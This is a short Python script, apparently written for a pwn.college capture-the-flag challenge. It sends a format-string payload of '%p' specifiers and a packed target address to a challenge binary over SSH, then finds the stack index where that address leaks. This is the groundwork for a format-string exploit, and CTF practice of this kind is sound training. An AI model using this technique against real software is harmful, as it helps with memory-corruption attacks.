import subprocess
import struct

ADDR = 0x404100
SSH_CMD = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.0",
]

N = 60
PAD = 3

fmt = ("AAA " + ("%p " * N)).encode()
payload = fmt + b"B" * PAD + struct.pack("<Q", ADDR)

res = subprocess.run(SSH_CMD, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

line = None
for l in out.splitlines():
    if l.startswith("AAA "):
        line = l
        break

print(out)
if line:
    vals = line.split()[1:]  # remove 'AAA'
    for idx, token in enumerate(vals, start=1):
        if token.lower() == "0x404100":
            print("Pointer at index", idx)
            break
    else:
        print("Pointer not found in first", len(vals), "entries")
